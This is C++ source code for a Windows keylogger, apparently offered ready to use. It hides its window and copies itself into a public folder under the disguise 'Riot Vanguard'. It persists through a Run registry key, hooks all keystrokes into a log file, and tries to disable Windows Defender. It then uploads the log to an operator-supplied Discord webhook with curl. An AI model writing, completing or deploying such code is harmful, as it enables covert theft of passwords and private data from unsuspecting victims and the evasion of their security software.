#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <filesystem>
#include <cstdlib>

using namespace std;

// pre-define functions
void logKeyStroke(int key);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void selfClone(string clone_path);
void sendFile(string discord_webhook, string logfile_path);

int main()
{
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE); // hide the window

    // saving variables
    string clone_path = "C:\\Users\\Public\\Downloads\\Vanguard.exe"; // you can change the executable name
    string logfile_path = "C:\\Users\\Public\\Videos\\keylog.txt";

    // sending variables
    string discord_webhook = ""; // enter your discord webhook

    selfClone(clone_path);
  
	// add to startup
    HKEY hKey;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL
                                   , REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    const char* valueName = "Riot Vanguard";
    RegSetValueExA(hKey, valueName, 0, REG_SZ, (LPBYTE)clone_path.c_str(), clone_path.size());
    RegCloseKey(hKey);

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;

    // disable antivirus
    HKEY hKey1;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey1);
    DWORD value_data = 1;
    RegSetValueExA(hKey1, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&value_data, sizeof(value_data));
    RegCloseKey(hKey1);
    system("sc stop WinDefend");

    
    if(filesystem::exists(logfile_path))
    {
      sendFile(discord_webhook, logfile_path);
      DeleteFileA(logfile_path.c_str());
    }
    
    while (GetMessage(&msg, NULL, 0, 0))
    {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

    return 0;
}

void logKeyStroke(int key)
{
    ofstream logfile;
    string logfile_path = "C:\\Users\\Public\\Videos\\keylog.txt";
    logfile.open(logfile_path, ios::app);

    if (key == VK_BACK)
        logfile << "[BACKSPACE]";
    else if (key == VK_RETURN)
        logfile << "[ENTER]";
    else if (key == VK_TAB)
        logfile << "[TAB]";
    else if (key == VK_SPACE)
        logfile << "[SPACE]";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        logfile << "[SHIFT]";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        logfile << "[CTRL]";
    else if (key == VK_ESCAPE)
        logfile << "[ESC]";
    else if (key == VK_OEM_PERIOD)
        logfile << "[DOT]";
    else if (key >= '0' && key <= '9')
        logfile << char(key);
    else if (key >= 'A' && key <= 'Z')
        logfile << char(key);
    else if (key >= 'a' && key <= 'z')
        logfile << char(key);
    else
        logfile << "[" << key << "]";
    logfile.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;
        logKeyStroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void selfClone(string clone_path)
{
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    if (filesystem::exists(clone_path))
        return;

    ifstream src(exe_path, ios::binary);
    ofstream dst(clone_path, ios::binary);

    dst << src.rdbuf();

    src.close();
    dst.close();
}

void sendFile(string discord_webhook, string logfile_path)
{
    string command = "curl -F \"file=@" + logfile_path + "\" " + discord_webhook;
    system(command.c_str());
}
